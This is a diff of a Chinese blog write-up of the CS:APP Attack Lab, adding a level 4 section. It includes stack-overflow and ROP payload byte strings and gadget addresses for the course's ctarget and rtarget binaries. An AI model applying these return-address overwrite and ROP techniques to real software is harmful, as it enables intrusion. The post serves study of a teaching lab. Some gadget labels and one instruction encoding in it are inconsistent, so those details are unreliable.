@@ -15,6 +15,10 @@ tags:
 
 touch1 不需要写汇编代码，只要利用一定长度的字符串修改函数的返回地址即可。
 
+<!-- more -->
+
+先来看一下相关函数的汇编代码：
+
 ```assembly
 Dump of assembler code for function getbuf:
    0x00000000004017a8 <+0>:     sub    $0x28,%rsp
@@ -43,7 +47,7 @@ End of assembler dump.
 
 所以答案应该是（其实不应该有换行的！）：
 
-```markdown
+```bash
 00 00 00 00
 00 00 00 00 
 00 00 00 00 
@@ -90,9 +94,9 @@ ret
 
 命令行中输入以下指令：
 
-```
-gcc -c touch2.sol.s
-objdump -d touch2.sol.o > touch2.sol.d
+```bash
+$ gcc -c touch2.sol.s
+$ objdump -d touch2.sol.o > touch2.sol.d
 ```
 
 得到的 `touch2.sol.d` 文件中包含以下内容：
@@ -120,7 +124,7 @@ Disassembly of section .text:
 
 现在我们来查看一下栈的地址。
 
-```shell
+```bash
 (gdb) disas getbuf 
 Dump of assembler code for function getbuf:
    0x00000000004017a8 <+0>:	sub    $0x28,%rsp
@@ -179,7 +183,7 @@ Quit
 
 以下是答案：
 
-```
+```bash
 48 c7 c7 fa 
 97 b9 59 68 
 ec 17 40 00 
@@ -203,13 +207,13 @@ c3 00 00 00
 
 我的是：
 
-```
+```bash
 35 39 62 39 39 37 66 61
 ```
 
 `touch2 ` 与 `touch3` 有着一些相似性，这里我们先修改一下 `touch2` 的答案，看看情况。
 
-```
+```bash
 48 c7 c7 fa 
 97 b9 59 68 
 ec 17 40 00 
@@ -225,7 +229,7 @@ c3 00 00 00
 
 尝试运行：
 
-```shell
+```bash
 (gdb) run -q -i touch3.sol.r.txt 
 Starting program: /home/cwwang/文档/csapp/lab3/target1/ctarget -q -i touch3.sol.r.txt
 Cookie: 0x59b997fa
@@ -296,11 +300,118 @@ ret
 
 最终答案：
 
-```shell
+```bash
 68 fa 18 40  00 48 c7 c7  b8 dc 61 55  c3 00 00 00 # 汇编码
 00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 
 00 00 00 00  00 00 00 00  78 dc 61 55  00 00 00 00 # 栈顶
 00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 
 35 39 62 39  39 37 66 61                           # cookie
+```
+
+## level 4
+
+先使用 `objdump -d rtarget > rtarget.txt` 命令，方便查看机器码。
+
+```assembly
+0000000000401994 <start_farm>:
+  401994:	b8 01 00 00 00       	mov    $0x1,%eax
+  401999:	c3                   	retq   
+
+000000000040199a <getval_142>:
+  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
+  40199f:	c3                   	retq   
+
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+
+00000000004019ae <setval_237>:
+  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
+  4019b4:	c3                   	retq   
+
+00000000004019b5 <setval_424>:
+  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
+  4019bb:	c3                   	retq   
+
+00000000004019bc <setval_470>:
+  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
+  4019c2:	c3                   	retq   
+
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+
+00000000004019d0 <mid_farm>:
+  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
+  4019d5:	c3                   	retq   
+```
+
+以下是对照表：
+
+![movq](/CS-APP-Attack-Lab-笔记/movq.PNG)
+
+![movl](/CS-APP-Attack-Lab-%E7%AC%94%E8%AE%B0/movl.PNG)
+
+因为要靠 `ret` 来跳转，所以我们只关心 `c3` 字节出现的地方。经过细心地排查，终于在这里找到了我们想要的 gadget：
+
+```assembly
+# gadget1
+# 48 89 c7
+# 90
+# c3
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+
+# gadget2
+# 58
+# 90
+# c3
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+```
+
+没错，就是位于 `0x4019c5` 的指令与位于 `0x4019cc` 的指令！如下：
+
+```assembly
+movq %rax, %rdi # 48 80 c7
+nop             # 90
+ret             # c3
+```
+
+```assembly
+popq %rax       # 58
+nop             # 90
+ret             # c3
+```
+
+通过这两个 gadget，我们就可以完成 level 4 了。具体操作如下：
+
+1. 前 `0x28` 个字节没有用处，因为栈上的指令无法执行，所以从第 41 个字节开始，写入 `gadget1` 的地址。（因为是 64 位系统，后面要补 4 字节 0）
+2. 从第 49 个字节开始，写入 `cookie`，这样 `popq` 指令就能把 `cookie` 传入 `%rax` 寄存器中。
+3. 紧跟着是 `gadget2` 的地址，这样 `ret` 指令就会跳转到 `gadget2` 的入口。
+4. `gadget2` 中会把 `%rax` 中的值传给 `%rdi`，然后执行 `ret` 指令。因为我们要进入 `touch2`，所以接下来要写入 `touch2` 的入口地址。
+
+最终答案为：
+
+```
+00 00 00 00  00 00 00 00  
+00 00 00 00  00 00 00 00 
+00 00 00 00  00 00 00 00 
+00 00 00 00  00 00 00 00 
+00 00 00 00  00 00 00 00 
+cc 19 40 00  00 00 00 00 # gadget1
+fa 97 b9 59  00 00 00 00 # cookie
+c5 19 40 00  00 00 00 00 # gadget2
+ec 17 40 00  00 00 00 00 # touch2
 ```
 
